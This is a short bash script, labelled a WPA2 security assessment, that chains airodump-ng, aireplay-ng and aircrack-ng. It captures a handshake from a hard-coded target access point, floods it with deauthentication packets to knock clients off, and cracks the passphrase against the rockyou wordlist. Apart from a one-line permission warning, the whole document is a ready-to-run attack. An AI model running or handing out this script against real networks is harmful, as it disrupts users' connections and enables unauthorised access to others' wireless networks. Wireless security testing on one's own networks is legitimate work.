#!/bin/bash
# WiFi Security Assessment - WPA2 Handshake Capture and Crack
# WARNING: Only use on networks you own or have permission to test

# Configuration - MODIFY THESE VALUES
TARGET_BSSID="F0:A7:31:27:EC:FB"  # Replace with your target
CHANNEL="3"                        # Replace with target channel
OUTPUT_FILE="wpa2_capture"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "=== WPA2 Security Assessment ==="
echo "Target: $TARGET_BSSID"
echo "Channel: $CHANNEL"
echo ""

echo "Step 1: Capturing handshake..."
echo "Starting packet capture (press Ctrl+C in other terminal after handshake)"
sudo airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w $OUTPUT_FILE wlan0mon &

sleep 5

echo "Step 2: Sending deauthentication packets..."
sudo aireplay-ng -0 10 -a $TARGET_BSSID wlan0mon

echo "Step 3: Attempting to crack password..."
echo "This may take a while depending on password complexity..."
sudo aircrack-ng $OUTPUT_FILE-01.cap -w $WORDLIST
